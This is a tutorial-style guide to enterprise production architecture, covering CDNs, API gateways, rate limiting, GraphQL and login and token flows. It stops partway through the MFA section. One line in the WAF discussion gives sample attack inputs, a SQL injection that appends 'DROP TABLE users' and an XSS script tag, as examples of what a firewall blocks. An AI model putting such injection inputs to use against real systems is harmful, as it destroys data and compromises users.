# 🏗️ ENTERPRISE PRODUCTION ARCHITECTURE BIBLE
## How Companies Like Facebook, Netflix, and Uber Build, Deploy, Scale, and Secure Systems Serving Billions of Users

> **Document Scope:** This document covers the complete end-to-end architecture of a production-grade enterprise system from the moment a developer writes code to the moment a user in Tokyo receives a response in 50 milliseconds. Every layer, every decision, every trade-off is explained with flowcharts, code examples, and real-world context.

---

## 📋 TABLE OF CONTENTS

1. [The Problem with Simple Apps](#1-the-problem-with-simple-apps)
2. [Architectural Philosophy: Monolith vs Microservices](#2-architectural-philosophy-monolith-vs-microservices)
3. [The Complete System Architecture Overview](#3-the-complete-system-architecture-overview)
4. [Layer 1: The Client Layer (Frontend)](#4-layer-1-the-client-layer-frontend)
5. [Layer 2: The CDN and Edge Network](#5-layer-2-the-cdn-and-edge-network)
6. [Layer 3: The API Gateway](#6-layer-3-the-api-gateway)
7. [Layer 4: The Authentication System](#7-layer-4-the-authentication-system)
8. [Layer 5: Microservices Architecture](#8-layer-5-microservices-architecture)
9. [Layer 6: Inter-Service Communication](#9-layer-6-inter-service-communication)
10. [Layer 7: The Database Layer](#10-layer-7-the-database-layer)
11. [Layer 8: Caching Strategy](#11-layer-8-caching-strategy)
12. [Layer 9: Asynchronous Messaging (Kafka)](#12-layer-9-asynchronous-messaging-kafka)
13. [Layer 10: Real-Time Communication](#13-layer-10-real-time-communication)
14. [Layer 11: File Storage and Media Processing](#14-layer-11-file-storage-and-media-processing)
15. [Layer 12: Search Infrastructure](#15-layer-12-search-infrastructure)
16. [Layer 13: Security Architecture (In Depth)](#16-layer-13-security-architecture-in-depth)
17. [Layer 14: Containerization with Docker](#17-layer-14-containerization-with-docker)
18. [Layer 15: Container Orchestration with Kubernetes](#18-layer-15-container-orchestration-with-kubernetes)
19. [Layer 16: Infrastructure as Code with Terraform](#19-layer-16-infrastructure-as-code-with-terraform)
20. [Layer 17: CI/CD Pipeline](#20-layer-17-cicd-pipeline)
21. [Layer 18: Observability (Metrics, Logging, Tracing)](#21-layer-18-observability-metrics-logging-tracing)
22. [Layer 19: Disaster Recovery and Resilience](#22-layer-19-disaster-recovery-and-resilience)
23. [Layer 20: Performance Optimization](#23-layer-20-performance-optimization)
24. [Complete Request Lifecycle (End-to-End Flow)](#24-complete-request-lifecycle-end-to-end-flow)
25. [Database Design Patterns at Scale](#25-database-design-patterns-at-scale)
26. [The Facebook-Scale News Feed Architecture](#26-the-facebook-scale-news-feed-architecture)
27. [Cost Management at Scale](#27-cost-management-at-scale)
28. [Team Structure and Ownership](#28-team-structure-and-ownership)
29. [Glossary of Terms](#29-glossary-of-terms)

---

## 1. The Problem with Simple Apps

When you first learn to code, you build something that looks like this:

```
Browser → Node.js App → SQLite Database
```

This is perfectly fine for learning. But the moment real users start using your app, a cascade of problems emerges that this simple architecture cannot handle.

### 1.1 The Problems That Arise at Scale

**Problem 1: A Single Server Is a Single Point of Failure**

If your one server crashes at 2am, your entire application is down. For a company with millions of users, every minute of downtime costs thousands of dollars and destroys user trust.

```
SIMPLE ARCHITECTURE (FRAGILE):

    Millions of Users
          ↓
    Single Server ← ❌ If this dies, everything dies
          ↓
    Single Database ← ❌ If this fills up, everything stops
```

**Problem 2: Vertical Scaling Has a Hard Limit**

When traffic grows, the naive solution is to "upgrade the server" — buy more RAM, add more CPUs. This is called **Vertical Scaling**. It works up to a point, but:
- The most powerful server AWS sells has 448 CPUs and 24 TB of RAM.
- Facebook serves 3 billion users. No single machine exists that can handle that.
- Vertical scaling has an upper ceiling.
- While you're upgrading the server, the app is down.

**Problem 3: One Codebase Becomes Unmanageable**

When 1,000 developers all work on the same codebase:
- Merging code becomes a nightmare. Developers step on each other's work constantly.
- A bug in the "Photo Upload" feature can crash the "Messaging" feature because they live in the same process.
- Deploying a small change to the "Like Button" requires deploying the entire application, taking everything offline briefly.
- Different features have radically different performance requirements. The video encoding system needs massive CPU. The chat system needs thousands of open network connections. You cannot optimize one server for both.

**Problem 4: Databases Become Bottlenecks**

A single PostgreSQL database has a read/write limit. At a certain point, thousands of simultaneous queries will cause the database to queue up, then time out, then crash.

---

## 2. Architectural Philosophy: Monolith vs Microservices

Before you write a single line of code, the most important architectural decision is whether to build a **Monolith** or **Microservices**.

### 2.1 The Monolith

A monolith is a single, unified codebase where all features (user management, feed, messaging, payments) live together and are deployed as one unit.

```
┌──────────────────────────────────────────────────────────────┐
│                    MONOLITH SERVER                          │
│                                                              │
│   ┌─────────────┐  ┌───────────────┐  ┌──────────────────┐ │
│   │ User Module │  │  Feed Module  │  │ Payments Module  │ │
│   └─────────────┘  └───────────────┘  └──────────────────┘ │
│   ┌─────────────┐  ┌───────────────┐  ┌──────────────────┐ │
│   │  Chat Mod   │  │ Search Module │  │ Notifications    │ │
│   └─────────────┘  └───────────────┘  └──────────────────┘ │
│                                                              │
│                    Shared Database                          │
└──────────────────────────────────────────────────────────────┘
```

**When Monolith is the RIGHT choice:**
- You are a startup with fewer than 10 developers
- You are still figuring out your product-market fit
- Your traffic is under 10,000 users per day
- Speed of development matters more than scalability right now
- Facebook, Amazon, Netflix ALL started as monoliths!

**Monolith Pros:**
- Extremely fast to develop initially
- Simple to deploy (just one thing to deploy)
- Easy to debug (everything is in one place)
- No network overhead between modules
- Simple to test

**Monolith Cons:**
- Cannot scale individual features independently
- One bug crashes everything
- Large teams fight over the same codebase
- Tech stack is locked (can't use Go for one feature, Python for another)
- Deployments are slow and risky as the codebase grows

### 2.2 Microservices

Microservices is an architecture where each feature/domain is its own completely independent application with its own codebase, its own database, its own deployment cycle, and its own technology stack.

```
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│   USER   │   │   FEED   │   │  CHAT    │   │PAYMENTS  │
│ SERVICE  │   │ SERVICE  │   │ SERVICE  │   │ SERVICE  │
│ NestJS   │   │   Go     │   │ Erlang   │   │  Java    │
│ Postgres │   │  Redis   │   │ Cassandra│   │ Postgres │
└──────────┘   └──────────┘   └──────────┘   └──────────┘
     ↑               ↑               ↑               ↑
     └───────────────┴───────────────┴───────────────┘
                         │
              Message Bus (Kafka) or API Gateway
```

**When Microservices is the RIGHT choice:**
- You have more than 50 developers
- You need to scale specific features independently (video service needs 10x more servers during events)
- Your features have radically different technology needs
- Different parts of the app need different deployment frequencies
- You have strong DevOps maturity (Kubernetes, CI/CD, monitoring)

**Microservices Pros:**
- Scale each service independently (only spin up more video servers during live streams)
- A bug in the Feed service doesn't crash Payments
- Teams own and deploy their services independently
- Mix programming languages (Go for speed, Python for ML, Java for finance)
- Smaller codebases are easier to understand

**Microservices Cons:**
- Massive operational complexity (50 services = 50 things that can break)
- Network latency between services adds up
- Distributed transactions are extremely hard
- Much harder to debug (a request touches 15 services — which one is slow?)
- Requires mature DevOps infrastructure (Kubernetes, service mesh, distributed tracing)

### 2.3 The Hybrid Approach: "Modular Monolith" → Microservices

The real-world approach used by Facebook, Netflix, Amazon, Uber:

```
Stage 1 (0-1 years):     Monolith. Move fast, validate product.
Stage 2 (1-3 years):     Modular Monolith. Clean internal boundaries.
Stage 3 (3-5 years):     Extract hotspots to microservices one by one.
Stage 4 (5+ years):      Full microservices for proven domains.
```

Facebook ran as a PHP monolith for years. Amazon ran as a Java monolith for years. They only broke it apart when the pain became undeniable.

---

## 3. The Complete System Architecture Overview

Here is the 10,000-foot view of a production enterprise system. Everything that follows in this document is an expansion of one box in this diagram.

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                    USERS (3 BILLION)                                      ║
║         Web Browser │ iOS App │ Android App │ API Clients                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
                                    │
                                    ▼
╔═══════════════════════════════════════════════════════════════════════════╗
║                    EDGE LAYER                                             ║
║   Cloudflare CDN + DDoS Protection + WAF + Global DNS Load Balancing     ║
╚═══════════════════════════════════════════════════════════════════════════╝
                                    │
                    ┌───────────────┴───────────────┐
                    ▼                               ▼
           ┌─────────────────┐           ┌──────────────────┐
           │  STATIC ASSETS  │           │  DYNAMIC TRAFFIC │
           │ (CDN Edge Cache)│           │  (Origin Servers)│
           │  Images, JS, CSS│           └────────┬─────────┘
           └─────────────────┘                    │
                                                  ▼
╔═══════════════════════════════════════════════════════════════════════════╗
║                    API GATEWAY LAYER                                      ║
║         Kong / AWS API Gateway + Nginx Load Balancer                     ║
║  Authentication │ Rate Limiting │ Routing │ SSL Termination              ║
╚═══════════════════════════════════════════════════════════════════════════╝
                                    │
          ┌─────────┬──────────┬────┴────┬──────────┬─────────┐
          ▼         ▼          ▼         ▼          ▼         ▼
    ┌──────────┐ ┌──────┐ ┌──────┐ ┌────────┐ ┌────────┐ ┌──────┐
    │  USER    │ │ FEED │ │CHAT  │ │SEARCH  │ │PAYMENT │ │VIDEO │
    │ SERVICE  │ │ SVC  │ │ SVC  │ │  SVC   │ │  SVC   │ │ SVC  │
    └──────────┘ └──────┘ └──────┘ └────────┘ └────────┘ └──────┘
          │         │          │         │          │         │
          └─────────┴──────────┴────┬────┴──────────┴─────────┘
                                    │
╔═══════════════════════════════════════════════════════════════════════════╗
║                    MESSAGE BUS LAYER                                      ║
║                    Apache Kafka                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
                                    │
╔═══════════════════════════════════════════════════════════════════════════╗
║                    DATA LAYER                                             ║
║  PostgreSQL │ MongoDB │ Cassandra │ Redis │ Elasticsearch │ S3           ║
╚═══════════════════════════════════════════════════════════════════════════╝
                                    │
╔═══════════════════════════════════════════════════════════════════════════╗
║                    INFRASTRUCTURE LAYER                                   ║
║      Kubernetes Cluster + Terraform + AWS/GCP/Azure                      ║
╚═══════════════════════════════════════════════════════════════════════════╝
                                    │
╔═══════════════════════════════════════════════════════════════════════════╗
║                    OBSERVABILITY LAYER                                    ║
║      Prometheus + Grafana + ELK Stack + Jaeger + PagerDuty              ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

---

## 4. Layer 1: The Client Layer (Frontend)

### 4.1 The Multi-Platform Reality

A production enterprise app like Facebook does not have "a frontend." It has a **frontend ecosystem** serving dozens of different client types:

```
CLIENT ECOSYSTEM:

Web Browsers:
├── Desktop Web          → Next.js (React 18, SSR)
└── Mobile Web (PWA)     → Next.js with Progressive Web App config

Native Mobile:
├── iOS App              → React Native / Swift (UIKit)
└── Android App          → React Native / Kotlin (Jetpack Compose)

Other Clients:
├── Public API           → REST / GraphQL (for third-party developers)
├── Smart TV App         → React Native for TV
└── Internal Admin Tools → Angular (complex data-heavy dashboards)
```

### 4.2 Why Next.js for the Public-Facing Site

The public site is what every user lands on. It needs to load **blazing fast** and be discoverable by Google. Next.js provides:

**Server-Side Rendering (SSR):**
```
Without SSR (React Vanilla):
  Browser receives: <html><body><div id="root"></div></body></html>
  Browser runs JavaScript → React populates the page
  Google crawler gives up after 5 seconds → BAD SEO

With SSR (Next.js):
  Server runs React → produces full HTML
  Browser receives: <html><body><h1>Top Jobs</h1><div class="job-list">...</div></body></html>
  Page is visible INSTANTLY before JavaScript even loads → GREAT SEO
```

**Static Site Generation (SSG):**
For pages that don't change often (landing pages, marketing pages), Next.js pre-generates the HTML at **build time** and stores it. When a user requests the page, the server just sends a pre-built HTML file — faster than any SSR or CSR approach.

```
Build time:
  Next.js → Generates /about.html, /pricing.html, /blog.html
  → Stores them on the CDN

User request:
  Browser → CDN → Returns pre-built HTML instantly (5ms response time)
  No server computation needed at all
```

**Incremental Static Regeneration (ISR):**
The best of both worlds. Pages are pre-generated, but Next.js automatically regenerates them in the background when data changes.

```typescript
// pages/jobs/[id].tsx
export async function getStaticProps({ params }) {
  const job = await fetchJob(params.id);
  return {
    props: { job },
    revalidate: 60, // Regenerate this page every 60 seconds if a request comes in
  };
}
```

### 4.3 The App Shell Architecture

Large SPAs use the "App Shell" pattern to feel instant:

```
Initial Load:
1. Server sends minimal HTML (the "shell") — loads in 100ms
2. Service Worker caches the shell offline
3. JavaScript hydrates the page — adds interactivity
4. Data fetching populates the content

Subsequent Loads:
1. Service Worker serves cached shell INSTANTLY (0ms)
2. App boots before network request even starts
3. New data loaded in background and displayed
```

### 4.4 Frontend Performance Metrics (Core Web Vitals)

Google measures the quality of your frontend using three metrics. Production apps are obsessed with these:

| Metric | What It Measures | Target |
|---|---|---|
| **LCP** (Largest Contentful Paint) | How fast the main content loads | < 2.5 seconds |
| **FID** (First Input Delay) | How fast the page responds to first click | < 100ms |
| **CLS** (Cumulative Layout Shift) | How much the layout jumps around | < 0.1 |

**How to optimize them:**
- LCP: Server-side rendering, image optimization, CDN
- FID: Code splitting, lazy loading, minimize JavaScript bundle size
- CLS: Always specify image dimensions in HTML, avoid injecting content above existing content

### 4.5 Code Splitting and Lazy Loading

A production Next.js app never loads all code at once. It splits code into chunks and loads them on demand:

```typescript
// ❌ BAD: Loads everything upfront. Slow initial load.
import VideoPlayer from '../components/VideoPlayer';
import PDFViewer from '../components/PDFViewer';
import MapComponent from '../components/MapComponent';

// ✅ GOOD: Lazy load heavy components only when needed
import dynamic from 'next/dynamic';

const VideoPlayer = dynamic(() => import('../components/VideoPlayer'), {
  loading: () => <div>Loading video player...</div>,
  ssr: false // Only load in browser, not during SSR
});

const MapComponent = dynamic(() => import('../components/MapComponent'), {
  ssr: false
});
```

### 4.6 State Management at Scale

For large applications, state management becomes critical. The evolution of how teams manage state:

```
OPTION 1: React Context API
  Good for: Small apps, simple state (theme, auth status)
  Bad for: Frequently updating state — causes unnecessary re-renders

OPTION 2: Redux Toolkit
  Good for: Complex, global state that many components share
  Pattern: Store → Actions → Reducers → Selectors
  Used by: Twitter, LinkedIn

OPTION 3: Zustand (Modern Alternative)
  Good for: Simpler syntax than Redux, same power
  Pattern: Create a store hook, use it directly in components

OPTION 4: React Query / TanStack Query (Best for Server State)
  Good for: Managing data fetched FROM the server (caching, refetching, loading states)
  This is the MOST IMPORTANT one — handles:
    - Automatic caching and cache invalidation
    - Background refetching
    - Optimistic updates (UI updates before server confirms)
    - Pagination and infinite scrolling

OPTION 5: Jotai / Recoil (Atomic State)
  Good for: Granular, fine-grained state — only re-renders components
            that use a specific atom, not the entire tree
```

**The industry consensus in 2024:**
- Use **React Query** for all server state (API data)
- Use **Zustand** or **Context** for pure UI state (is modal open? what tab is selected?)
- Avoid Redux for new projects unless the team already knows it deeply

---

## 5. Layer 2: The CDN and Edge Network

### 5.1 What is a CDN and Why It Is Non-Negotiable at Scale

CDN stands for **Content Delivery Network**. It is a global network of servers positioned in data centers near users all around the world.

**The fundamental problem CDN solves:**

```
WITHOUT CDN:

User in Tokyo → Request → Your Server in New York → Response → Tokyo
Network distance: 11,000 km
Round-trip time: ~300ms

This 300ms is PHYSICS. You cannot make data travel faster than the speed of light.
For a page that makes 50 API calls, this is 15 seconds of latency. Unusable.
```

```
WITH CDN (Cloudflare, for example):

Cloudflare has 200+ data centers globally.

User in Tokyo → Request → Cloudflare server in Tokyo (10km away!) → Response
Round-trip time: 5-10ms

The CDN server in Tokyo already has a cached copy of your static files.
The user gets a response in milliseconds, not hundreds of milliseconds.
```

### 5.2 What Gets Cached on the CDN

Not everything should be CDN-cached:

```
✅ CACHE ON CDN (Static / Rarely Changing):
  - JavaScript bundles (.js files)
  - CSS stylesheets (.css files)
  - Images (profile photos, logos, banners)
  - Videos (pre-transcoded clips)
  - Fonts
  - Pre-generated static HTML pages (SSG pages)
  - API responses that are the same for all users (public job listings)

❌ NEVER CACHE ON CDN (Dynamic / User-Specific):
  - Personalized news feed (different for every user)
  - Private messages
  - Authentication tokens
  - Payment information
  - Any page that contains "Hello, [Username]"
  - Admin dashboards
```

### 5.3 CDN Cache Control Headers

You control CDN behavior through HTTP response headers that your server sends:

```typescript
// Next.js API route example — configure caching
export async function GET(request: Request) {
  const jobs = await fetchPublicJobListings();
  
  return NextResponse.json(jobs, {
    headers: {
      // Cache this response on CDN for 1 hour
      // But allow it to be "stale" for up to 1 day while being regenerated
      'Cache-Control': 'public, s-maxage=3600, stale-while-revalidate=86400'
    }
  });
}
```

```
Cache-Control directives explained:

public → CDN is allowed to cache this
private → Only browser can cache (NOT CDN) — use for user-specific data
s-maxage=3600 → CDN keeps this cached for 3600 seconds (1 hour)
max-age=300 → Browser keeps this cached for 300 seconds (5 minutes)
stale-while-revalidate=86400 → Serve stale cache for up to 1 day while fetching fresh in background
no-store → NEVER cache this (for sensitive data like auth pages)
```

### 5.4 Cloudflare in Depth

Cloudflare is not just a CDN. At the enterprise level, it provides a complete security and performance platform:

**Cloudflare Services used at enterprise scale:**

```
1. CDN: Global caching of static assets across 200+ data centers

2. DDoS Protection:
   - Absorbs attacks of 100+ Tbps (terabits per second)
   - During a DDoS attack, millions of fake requests flood your server
   - Cloudflare identifies these as fake and drops them at the edge
   - Your server never even sees the attack traffic

3. WAF (Web Application Firewall):
   - Blocks SQL injection: someone tries: /api/users?id=1 OR 1=1; DROP TABLE users
   - Blocks XSS: someone tries to inject <script>alert('hacked')</script>
   - Blocks bad bots from scraping your site
   - Rules update automatically as new attacks are discovered

4. Global Load Balancing (DNS):
   - Your app runs in 3 different cloud regions (US, EU, Asia)
   - Cloudflare's DNS routes users to the nearest healthy region
   - If the US data center goes down, users are automatically routed to EU

5. Cloudflare Workers (Edge Computing):
   - Run JavaScript code ON the CDN server, close to the user
   - Example: A/B testing logic runs at the edge, not in your origin server
   - Example: Redirects are handled in 1ms at the edge, not 300ms round-trip
   - Example: Authentication token validation at the edge
```

### 5.5 Image Optimization Pipeline

Images account for 60-80% of a web page's download size. A proper enterprise image pipeline:

```
ORIGINAL IMAGE UPLOAD:
  User uploads photo (20MB JPEG, 5000x5000px)
          ↓
IMAGE PROCESSING SERVICE (runs on Kafka message):
  ├── Resize to multiple dimensions:
  │   ├── thumbnail: 100x100px
  │   ├── preview: 400x400px
  │   ├── medium: 800x800px
  │   └── large: 1600x1600px
  ├── Convert formats:
  │   ├── WebP (40% smaller than JPEG, supported by modern browsers)
  │   └── AVIF (50% smaller than JPEG, newest format)
  ├── Apply compression (quality: 80% — imperceptible quality loss)
  └── Store all variants in S3
          ↓
HTML in Next.js:
  <Image
    src="https://cdn.yourapp.com/photos/user123/large.webp"
    srcSet="
      https://cdn.yourapp.com/photos/user123/thumbnail.webp 100w,
      https://cdn.yourapp.com/photos/user123/medium.webp 800w,
      https://cdn.yourapp.com/photos/user123/large.webp 1600w
    "
    sizes="(max-width: 600px) 100px, (max-width: 1200px) 800px, 1600px"
  />
  // Browser automatically downloads the correct size for the screen
```

---

## 6. Layer 3: The API Gateway

### 6.1 The Problem Without an API Gateway

If there is no API Gateway, every client must know the address of every microservice:

```
❌ WITHOUT API GATEWAY:

Browser must know:
  - User Service: https://users-service.internal.yourapp.com:3000
  - Feed Service: https://feed-service.internal.yourapp.com:4000
  - Chat Service: https://chat-service.internal.yourapp.com:5000
  - Payment Service: https://payments-service.internal.yourapp.com:6000

Problems:
  1. Security nightmare: All services are exposed to the internet
  2. Every service must implement its own authentication
  3. Every service must implement its own rate limiting
  4. If you rename a service, clients break
  5. No central logging of all API calls
```

### 6.2 The API Gateway Solution

```
✅ WITH API GATEWAY:

Browser knows only ONE address:
  - https://api.yourapp.com

All requests go through the gateway:
  - https://api.yourapp.com/users/*     → User Service (internal, no internet exposure)
  - https://api.yourapp.com/feed/*      → Feed Service (internal)
  - https://api.yourapp.com/chat/*      → Chat Service (internal)
  - https://api.yourapp.com/payments/*  → Payment Service (internal)

Gateway handles:
  - Auth: "Is this token valid?" checked ONCE at the gateway
  - Rate Limiting: "This IP has made 1000 requests in 1 minute, block it"
  - SSL Termination: HTTPS is decrypted at the gateway, services use plain HTTP internally
  - Request/Response transformation
  - Centralized logging of every single API call
```

### 6.3 API Gateway Internals — Request Flow

```
Incoming Request:
POST /api/users/update-profile
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
Content-Type: application/json
Body: { "name": "John Doe", "bio": "Software Engineer" }

GATEWAY PROCESSING PIPELINE:

Step 1: TLS/SSL Termination
  - HTTPS connection decrypted
  - Certificate validated
  - Request is now plain HTTP internally

Step 2: IP Reputation Check
  - Is this IP on a blocklist? (Spammers, known attackers)
  - Is this a Tor exit node?
  → If yes: Return 403 Forbidden immediately

Step 3: Rate Limiting
  - Sliding window algorithm: 
    Check: "Has this IP made more than 100 requests in the last 60 seconds?"
  - Redis key: "rate_limit:{ip_address}" with TTL of 60 seconds
  - Increment counter on each request
  → If counter > 100: Return 429 Too Many Requests
  - Headers returned: X-RateLimit-Limit: 100, X-RateLimit-Remaining: 0

Step 4: Authentication
  - Extract JWT from Authorization header
  - Verify signature using public key
  - Check expiry timestamp
  - Decode payload: { "userId": "usr_123", "roles": ["user"], "exp": 1729875600 }
  → If invalid: Return 401 Unauthorized

Step 5: Authorization (Route-Level)
  - Check: Is the decoded role allowed to access POST /api/users/update-profile?
  - Route config: { path: "/api/users/update-profile", allowedRoles: ["user", "admin"] }
  → If not authorized: Return 403 Forbidden

Step 6: Request Routing
  - Match path /api/users/* → Route to User Service
  - Inject headers for downstream service:
    X-User-Id: usr_123
    X-User-Roles: user
    X-Correlation-Id: req_a1b2c3d4  ← For tracing this request across services
  - Strip the Authorization header (downstream service doesn't need it)

Step 7: Load Balancing
  - User Service has 10 running instances
  - Round-robin or least-connections algorithm picks instance #7
  - Forward request to user-service-pod-7:3000

Step 8: Response
  - User Service responds: 200 OK { "updated": true }
  - Gateway logs: { "requestId": "req_a1b2c3d4", "userId": "usr_123", "path": "/api/users/update-profile", "status": 200, "latency": 45ms }
  - Gateway returns response to client
```

### 6.4 Kong API Gateway Configuration

Kong is the most popular open-source API Gateway. Here is how it is configured:

```yaml
# kong.yaml

services:
  - name: user-service
    url: http://user-service:3000  # Internal Docker/Kubernetes address
    routes:
      - name: user-routes
        paths:
          - /api/users
        strip_path: true  # Remove /api/users prefix before forwarding
    
    plugins:
      # Authentication
      - name: jwt
        config:
          secret_is_base64: false
          key_claim_name: kid
      
      # Rate Limiting  
      - name: rate-limiting
        config:
          minute: 100           # 100 requests per minute per user
          hour: 1000            # 1000 per hour
          policy: local         # Use local Redis instance
          fault_tolerant: true  # Don't block if Redis is down
      
      # Request Logging
      - name: http-log
        config:
          http_endpoint: http://logstash:8080  # Send logs to ELK stack
          method: POST
```

### 6.5 Rate Limiting Algorithms Explained

Enterprise systems use sophisticated rate limiting algorithms, not simple counters:

**Algorithm 1: Fixed Window Counter**
```
Simple but has a flaw:
  Window: 0-60 seconds → limit: 100 requests
  
  Flaw: A user can make 100 requests at second 59, then 100 more at second 61
  = 200 requests in 2 seconds, bypassing the 100/minute limit
```

**Algorithm 2: Sliding Window Log**
```
Keeps a timestamped log of every request:
  On new request:
    1. Remove all log entries older than 1 minute
    2. Count remaining log entries
    3. If count >= 100, reject
    4. Add new timestamp to log
  
  Accurate but uses memory proportional to request count
```

**Algorithm 3: Token Bucket (Used by AWS, Stripe)**
```
Concept:
  - A "bucket" holds tokens (e.g., capacity: 100 tokens)
  - Tokens refill at a constant rate (e.g., 10 tokens per second)
  - Each request consumes 1 token
  - If bucket is empty, request is rejected

Benefits:
  - Allows short "bursts" of traffic (use all 100 tokens at once)
  - Smooths out traffic over time
  - Most fair for real users (bursts of activity are normal human behavior)
```

```
Implementation in Redis:
  local key = "rate_limit:" .. user_id
  local bucket_capacity = 100
  local refill_rate = 10  -- tokens per second
  local now = redis.call('TIME')[1]  -- current timestamp
  
  local current_tokens = redis.call('GET', key) or bucket_capacity
  local last_refill = redis.call('GET', key .. ":time") or now
  
  -- Calculate tokens to add based on time elapsed
  local elapsed = now - last_refill
  local new_tokens = math.min(bucket_capacity, current_tokens + (elapsed * refill_rate))
  
  if new_tokens >= 1 then
    redis.call('SET', key, new_tokens - 1)
    redis.call('SET', key .. ":time", now)
    return 1  -- Allow request
  else
    return 0  -- Reject request
  end
```

### 6.6 GraphQL as an Alternative to REST

Many enterprise companies (Facebook, GitHub, Twitter) use **GraphQL** instead of (or alongside) REST for their API Gateway.

**REST Problem: Over-fetching and Under-fetching**

```
REST: GET /api/users/123
Response: {
  "id": "123",
  "name": "John",
  "email": "john@example.com",
  "bio": "Engineer",
  "phone": "+1234567890",      // Not needed for this page
  "address": {...},             // Not needed for this page
  "preferences": {...},         // Not needed for this page
  "subscriptions": [...],       // Not needed for this page
}
// Over-fetching: Got too much data we don't need

REST: GET /api/posts/456 → Need author name too → GET /api/users/123 → Need comments → GET /api/comments?postId=456
// Under-fetching: Need 3 API calls for one page
```

**GraphQL Solution:**
```graphql
# Client asks for EXACTLY what it needs — nothing more, nothing less

query GetPostPage($postId: ID!) {
  post(id: $postId) {
    title
    content
    author {
      name        # ← From the User service
      profilePic
    }
    comments(first: 10) {
      text
      author {
        name
      }
    }
  }
}

# One request, get data from 3 different microservices
# Exactly the fields needed
```

---

## 7. Layer 4: The Authentication System

Authentication is one of the most critical and most commonly gotten wrong systems in production. A mistake here can expose the private data of millions of users.

### 7.1 Authentication vs Authorization

These two words are often confused:

```
AUTHENTICATION: "Who are you?"
  Verifying identity. You are who you claim to be.
  Example: Logging in with email + password

AUTHORIZATION: "What are you allowed to do?"
  Verifying permissions. You are allowed to see this resource.
  Example: You can view your own profile but not someone else's private info
```

### 7.2 The Complete Login Flow

```
Step 1: User submits login form
  POST /api/auth/login
  Body: { email: "user@example.com", password: "MyPassword123!" }

Step 2: Auth Service receives request
  1. Find user by email in database:
     SELECT id, email, password_hash, is_active FROM users WHERE email = ?
  
  2. Check if account is active:
     IF is_active = false → Return 403 "Account suspended"
  
  3. Check rate limiting:
     IF failed_login_attempts > 5 in last 15 minutes → Return 429 "Too many attempts"
  
  4. Verify password:
     bcrypt.compare(rawPassword, password_hash)
     → bcrypt is a deliberately SLOW hashing algorithm
     → Takes ~100ms per check — tolerable for real users, catastrophic for brute-force bots
     → IF mismatch → Increment failed_login_attempts counter
     → Return 401 "Invalid credentials" (SAME message for wrong email OR wrong password — never hint which)

Step 3: Generate tokens
  1. Access Token (JWT):
     {
       "header": { "alg": "RS256", "typ": "JWT" },
       "payload": {
         "sub": "usr_123456",        // Subject: user ID
         "email": "user@example.com",
         "roles": ["user"],
         "iat": 1729872000,           // Issued at timestamp
         "exp": 1729872900            // Expires in 15 minutes
       },
       "signature": "RS256(header + payload, PRIVATE_KEY)"
     }
     // Signed with RSA private key — only auth service can CREATE valid tokens
     // Any service can VERIFY a token using the public key
  
  2. Refresh Token:
     - A random, opaque string: "rt_a1b2c3d4e5f6..."
     - Stored in database: { token: "rt_a1b2...", userId: "usr_123", expiresAt: "30 days" }
     - Has no encoded data — just a key that points to the database record

Step 4: Set tokens securely
  // Access token returned in JSON response body
  // Frontend stores in memory (NOT localStorage — vulnerable to XSS attacks)
  
  // Refresh token set as HttpOnly, Secure, SameSite=Strict cookie
  // HttpOnly = JavaScript CANNOT read this cookie — immune to XSS
  // Secure = Only sent over HTTPS
  // SameSite=Strict = Not sent on cross-site requests — immune to CSRF
  
  Response headers:
    Set-Cookie: refresh_token=rt_a1b2c3d4; HttpOnly; Secure; SameSite=Strict; Path=/api/auth; Max-Age=2592000

Step 5: Frontend stores access token in memory
  // In a React/Next.js app:
  let accessToken = null;  // In-memory — lost on page refresh, that's intentional
  
  function setAccessToken(token) {
    accessToken = token;
  }
```

### 7.3 The Token Refresh Flow

Access tokens expire in 15 minutes. The user shouldn't have to log in every 15 minutes. The refresh token handles this silently:

```
Every API Call Flow:

1. Attach access token to request:
   Authorization: Bearer eyJhbGci...

2. If response is 401 Unauthorized:
   Access token has expired. Time to refresh.

3. Call refresh endpoint:
   POST /api/auth/refresh
   Cookie: refresh_token=rt_a1b2c3d4 (sent automatically by browser)

4. Auth service:
   a. Read refresh_token cookie
   b. Look up in database: SELECT * FROM refresh_tokens WHERE token = ?
   c. Verify: not expired, not revoked, belongs to active user
   d. Generate new access token (15min validity)
   e. Optionally rotate refresh token (generate new one, invalidate old)
   f. Return new access token

5. Retry the original failed request with new access token

6. If refresh also fails (refresh token expired or revoked):
   Force user to log in again
```

### 7.4 OAuth 2.0 and Social Login ("Sign in with Google")

```
Flow: "Sign in with Google"

1. User clicks "Sign in with Google"

2. Your app redirects to Google:
   https://accounts.google.com/oauth/authorize
   ?client_id=YOUR_GOOGLE_APP_ID
   &redirect_uri=https://yourapp.com/api/auth/google/callback
   &response_type=code
   &scope=openid email profile
   &state=random_csrf_token

3. User logs in on Google's page (your app NEVER sees their Google password)

4. Google redirects back to your app:
   https://yourapp.com/api/auth/google/callback?code=4/EXCHANGE_CODE&state=random_csrf_token

5. Your server exchanges code for tokens:
   POST https://oauth2.googleapis.com/token
   Body: { code: "4/EXCHANGE_CODE", client_id: ..., client_secret: ..., grant_type: "authorization_code" }
   
   Response: {
     access_token: "ya29.GoogleAccessToken",
     id_token: "eyJhbGci... JWT with user info"
   }

6. Your server decodes the id_token:
   { "sub": "google_user_id_12345", "email": "user@gmail.com", "name": "John Doe" }

7. Your server finds or creates the user:
   SELECT * FROM users WHERE google_id = 'google_user_id_12345'
   IF not found → INSERT INTO users (email, google_id, ...) VALUES (...)

8. Your server issues YOUR OWN JWT (same flow as Step 3 in login)
   → User is now logged into your app
```

### 7.5 Multi-Factor Authentication (MFA)

After the password check is successful:

```
MFA Flow (TOTP — Time-based One-Time Password):

1. User enables MFA:
   - Server generates a secret: "JBSWY3DPEHPK3PXP"
   - Server shows QR code encoding this secret
   - User scans with Google Authenticator / Authy
   - Authenticator generates 6-digit codes that change every 30 seconds

2. On login, after password verification:
   - Server has stored the user's MFA secret in database
   - Prompt user for 6-digit code
   
3. Server verifies the code:
   import { authenticator } from 'otplib';
   const isValid = authenticator.verify({
     token: userSubmittedCode,       // "847263"
     secret: user.mfa_secret         // From database
   });
   // TOTP algorithm uses current Unix timestamp ÷ 30 seconds + secret → generates same 6 digits
   // Both server and authenticator app generate same code at same time
   
